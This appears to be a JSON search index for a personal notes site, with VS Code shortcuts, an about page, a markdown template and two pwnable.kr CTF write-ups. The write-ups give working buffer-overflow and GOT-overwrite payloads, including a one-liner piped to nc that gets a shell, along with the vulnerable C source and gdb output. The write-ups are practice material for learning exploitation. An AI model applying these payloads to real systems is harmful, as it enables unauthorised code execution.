{
  "0": {
    "title": "",
    "content": "404 . Page not found :( . The requested page could not be found. .",
    "url": "http://localhost:4000/_notes/404.html",
    "relUrl": "/404.html"
  },
  "1": {
    "title": "vscode short cut",
    "content": "Visual studio Core 快捷 . 行操作 . alt+上 或 alt+下 快速移動一整行 | shift+alt+down 複製一行 | ctrl+shift+k 刪除一行 | . 快速選擇 . ctrl+F2 選取所有相同的名稱 | alt+ mouse click 多重選擇 | . 其他 . F8 依序查看警告訊息 | alt+F12 查看定義 | crtl+k, crtl+0 摺疊 | crtl+n 分割視窗 | . tags: Dev Tools .",
    "url": "http://localhost:4000/_notes/docs/ide-tools/VS%20core%20short%20cut.html",
    "relUrl": "/docs/ide-tools/VS%20core%20short%20cut.html"
  },
  "2": {
    "title": "About me",
    "content": "This Page is for noting something I occurred included IT, traveling and something I feel interested. . about me . Jerry Huang | Chinese Name:黃建智 | IT engineer | | . specialize: . .NET | Python | Javascript | WEB Stack | IOT | .",
    "url": "http://localhost:4000/_notes/about/",
    "relUrl": "/about/"
  },
  "3": {
    "title": "ide-tools",
    "content": "ide-tools . ide-tools document .",
    "url": "http://localhost:4000/_notes/docs/ide-tools",
    "relUrl": "/docs/ide-tools"
  },
  "4": {
    "title": "",
    "content": "",
    "url": "http://localhost:4000/_notes/",
    "relUrl": "/"
  },
  "5": {
    "title": "markdown",
    "content": "something about markdwon .",
    "url": "http://localhost:4000/_notes/docs/markdown",
    "relUrl": "/docs/markdown"
  },
  "6": {
    "title": "pentrue-test",
    "content": "pentrue-test . something about pt and fuzzy practice .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test",
    "relUrl": "/docs/pentrue-test"
  },
  "7": {
    "title": "project docs template",
    "content": "project docs template . Project Title . . Table of Contents . [TOC] . Beginners Guide . If you are a total beginner to this, start here! . Visit hackmd.io | Click “Sign in” | Choose a way to sign in | Start writing note! | User story . Feature: Guess the word # The first example has two steps Scenario: Maker starts a game When the Maker starts a game Then the Maker waits for a Breaker to join # The second example has three steps Scenario: Breaker joins a game Given the Maker has started a game with the word &quot;silky&quot; When the Breaker joins the Maker&#39;s game Then the Breaker must guess a word with 5 characters . I choose a lazy person to do a hard job. Because a lazy person will find an easy way to do it. [name=Bill Gates] . Feature: Shopping Cart As a Shopper I want to put items in my shopping cart Because I want to manage items before I check out Scenario: User adds item to cart Given I&#39;m a logged-in User When I go to the Item page And I click &quot;Add item to cart&quot; Then the quantity of items in my cart should go up And my subtotal should increment And the warehouse inventory should decrement . Read more about Gherkin here: https://docs.cucumber.io/gherkin/reference/ . User flows . Alice-&gt;Bob: Hello Bob, how are you? Note right of Bob: Bob thinks Bob--&gt;Alice: I am good thanks! Note left of Alice: Alice responds Alice-&gt;Bob: Where have you been? . Read more about sequence-diagrams here: http://bramp.github.io/js-sequence-diagrams/ . Project Timeline . gantt title A Gantt Diagram section Section A task :a1, 2014-01-01, 30d Another task :after a1 , 20d section Another Task in sec :2014-01-12 , 12d anther task : 24d . Read more about mermaid here: http://knsv.github.io/mermaid/ . Appendix and FAQ . :::info Find this document incomplete? Leave a comment! ::: .",
    "url": "http://localhost:4000/_notes/docs/markdown/project%20docs%20template.html",
    "relUrl": "/docs/markdown/project%20docs%20template.html"
  },
  "8": {
    "title": "pwnable_bof",
    "content": "pwnable bof . Source : . pwnable.kr . fuzzer 模糊字串產生方便debug . python import string import random def id_generator(size=6, chars=string.ascii_uppercase + string.digits): return ‘‘.join(random.choice(chars) for _ in range(size)) . | . 執行結果 . id_generator() ‘G5G74W’ id_generator(3, “6793YUIO”) ‘Y3U’ . ## 程式原始碼 c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah.. n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } . smash me! | if(key == 0xcafebabe)…… | 觀察key的位址直接修改 | . . solution . gdb . b func . . ##此處跳轉 cmp DWORD PTR [ebp+8],0xcafebabe . . ##覆蓋key的位址 ##計算後要52+4 &#39;A&#39;*52+ xbe xba xfe xca . . ##修改OK . . #debug python -c &quot;print &#39;A&#39;*52+&#39; xbe xba xfe xca&#39;&quot; &gt; input.txt #gdb r &lt; input.txt #nc pwnable.kr 9000 #keep stding with python cat &lt;(python -c &quot;print &#39;A&#39;*52+&#39; xbe xba xfe xca&#39;&quot;) - | nc pwnable.kr 9000 .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test/pwnable%20bof.html",
    "relUrl": "/docs/pentrue-test/pwnable%20bof.html"
  },
  "9": {
    "title": "pwnable_passout_code",
    "content": "pwnable ‘pass’code . Source : . pwnable.kr | gcc stack protection | gcc stack protection2 | linux got | linux got . 程式原始碼 . c #include #include #include . | . void login(){ int passcode1; int passcode2; . printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking... n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK! n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed! n&quot;); exit(0); } } . void welcome(){ char name[100]; printf(“enter you name : “); scanf(“%100s”, name); printf(“Welcome %s! n”, name); } . int main(){ printf(“Toddler’s Secure Login System 1.0 beta. n”); . welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :) n&quot;); return 0; } ## solution ### 查got表 passcode@ubuntu:~$ readelf -r passcode . Relocation section ‘.rel.dyn’ at offset 0x388 contains 2 entries: Offset Info Type Sym.Value Sym. Name 08049ff0 00000606 R_386_GLOB_DAT 00000000 gmon_start 0804a02c 00000b05 R_386_COPY 0804a02c stdin@GLIBC_2.0 Relocation section ‘.rel.plt’ at offset 0x398 contains 9 entries: Offset Info Type Sym.Value Sym. Name 0804a000 00000107 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 ##使用這個位址 0804a004 00000207 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a008 00000307 R_386_JUMP_SLOT 00000000 stack_chk_fail@GLIBC_2.4 0804a00c 00000407 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a010 00000507 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a014 00000607 R_386_JUMP_SLOT 00000000 __gmon_start 0804a018 00000707 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a01c 00000807 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a020 00000907 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 . ### disas login - 查完之後會發現scanf前的地址-0x10(%ebp) 剛好在&#39;a&#39;*96的後四位... gdb gef➤ x/x $ebp -0x10 0xffffcff8: 0x0804a010 . 將位址替換成fflush | scanf %d 0x080485e3(134514147),此處使很關鍵的地方表示fflush會被替換成 0x080485e3 &lt;+127&gt;: movl $0x80487af,(%esp) | ‘ n’ 應該表示是字串結尾 0xffffcff0: 0x61616161 0x61616161 0x0804a010 0x4ff54700 0xffffd000: 0x08048800 0xffffd0c4 0xffffd018 0x080486e0 0xffffd010: 0xf7fb23dc 0xffffd030 0x00000000 0xf7e18637 0xffffd020: 0xf7fb2000 0xf7fb2000 0x00000000 0xf7e18637 0xffffd030: 0x00000001 0xffffd0c4 0xffffd0cc 0x00000000 0xffffd040: 0x00000000 0x00000000 0xf7fb2000 0xf7ffdc04 0xffffd050: 0xf7ffd000 0x00000000 0xf7fb2000 0xf7fb2000 0xffffd060: 0x00000000 0xab31c77d 0x979a496d 0x00000000 . (gdb) disas login Dump of assembler code for function login: 0x08048564 &lt;+0&gt;: push %ebp 0x08048565 &lt;+1&gt;: mov %esp,%ebp 0x08048567 &lt;+3&gt;: sub $0x28,%esp 0x0804856a &lt;+6&gt;: mov $0x8048770,%eax 0x0804856f &lt;+11&gt;: mov %eax,(%esp) 0x08048572 &lt;+14&gt;: call 0x8048420 &lt;printf@plt&gt; 0x08048577 &lt;+19&gt;: mov $0x8048783,%eax 0x0804857c &lt;+24&gt;: mov -0x10(%ebp),%edx 0x0804857f &lt;+27&gt;: mov %edx,0x4(%esp) 0x08048583 &lt;+31&gt;: mov %eax,(%esp) 0x08048586 &lt;+34&gt;: call 0x80484a0 0x0804858b &lt;+39&gt;: mov 0x804a02c,%eax 0x08048590 &lt;+44&gt;: mov %eax,(%esp) 0x08048593 &lt;+47&gt;: call 0x8048430 &lt;fflush@plt&gt; 0x08048598 &lt;+52&gt;: mov $0x8048786,%eax 0x0804859d &lt;+57&gt;: mov %eax,(%esp) 0x080485a0 &lt;+60&gt;: call 0x8048420 &lt;printf@plt&gt; 0x080485a5 &lt;+65&gt;: mov $0x8048783,%eax 0x080485aa &lt;+70&gt;: mov -0xc(%ebp),%edx 0x080485ad &lt;+73&gt;: mov %edx,0x4(%esp) 0x080485b1 &lt;+77&gt;: mov %eax,(%esp) 0x080485b4 &lt;+80&gt;: call 0x80484a0 0x080485b9 &lt;+85&gt;: movl $0x8048799,(%esp) 0x080485c0 &lt;+92&gt;: call 0x8048450 &lt;puts@plt&gt; 0x080485c5 &lt;+97&gt;: cmpl $0x528e6,-0x10(%ebp) 0x080485cc &lt;+104&gt;: jne 0x80485f1 &lt;login+141&gt; 0x080485ce &lt;+106&gt;: cmpl $0xcc07c9,-0xc(%ebp) 0x080485d5 &lt;+113&gt;: jne 0x80485f1 &lt;login+141&gt; 0x080485d7 &lt;+115&gt;: movl $0x80487a5,(%esp) 0x080485de &lt;+122&gt;: call 0x8048450 &lt;puts@plt&gt; ##調用system ## 0x080485e3 &lt;+127&gt;: movl $0x80487af,(%esp) ## 0x080485ea &lt;+134&gt;: call 0x8048460 &lt;system@plt&gt; 0x080485ef &lt;+139&gt;: leave 0x080485f0 &lt;+140&gt;: ret 0x080485f1 &lt;+141&gt;: movl $0x80487bd,(%esp) 0x080485f8 &lt;+148&gt;: call 0x8048450 &lt;puts@plt&gt; 0x080485fd &lt;+153&gt;: movl $0x0,(%esp) 0x08048604 &lt;+160&gt;: call 0x8048480 &lt;exit@plt&gt; End of assembler dump. . print int(&quot;0x080485e3&quot;, 0) 134514147 python -c &quot;print (&#39;a&#39;*96+&#39; x04 xa0 x04 x08&#39;+&#39; n&#39;+&#39;134514147 n&#39;)&quot; | ./passcode . ### localtest gdb 0x80485bc &lt;login+33&gt; call 0x8048480 __isoc99_scanf@plt 0x80485c1 &lt;login+38&gt; add esp, 0x10 0x80485c4 &lt;login+41&gt; mov eax, ds:0x804a040 0x80485c9 &lt;login+46&gt; sub esp, 0xc 0x80485cc &lt;login+49&gt; push eax → 0x80485cd &lt;login+50&gt; call 0x8048420 fflush@plt ＃call 0x080485e3 ↳ 0x8048420 &lt;fflush@plt+0&gt; jmp DWORD PTR ds:0x804a010 0x8048426 &lt;fflush@plt+6&gt; push 0x8 0x804842b &lt;fflush@plt+11&gt; jmp 0x8048400 0x8048430 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a014 0x8048436 &lt;__stack_chk_fail@plt+6&gt; push 0x10 0x804843b &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048400 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]──── [#0] Id 1, Name: “passcode”, stopped, reason: SINGLE STEP ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]──── [#0] 0x80485cd → Name: login() [#1] 0x80486e0 → Name: main() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ n [New process 25845] process 25845 is executing new program: /bin/dash Error in re-setting breakpoint 1: Function “login” not defined. [New process 25846] process 25846 is executing new program: /bin/cat lfagqqqqqq!!!! n [Inferior 3 (process 25846) exited normally] enter passcode1 : Now I can safely trust you that you have credential :) [*] No debugging session active gef➤ . | . .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test/pwnable%20pass%20out%20code.html",
    "relUrl": "/docs/pentrue-test/pwnable%20pass%20out%20code.html"
  }
  
}
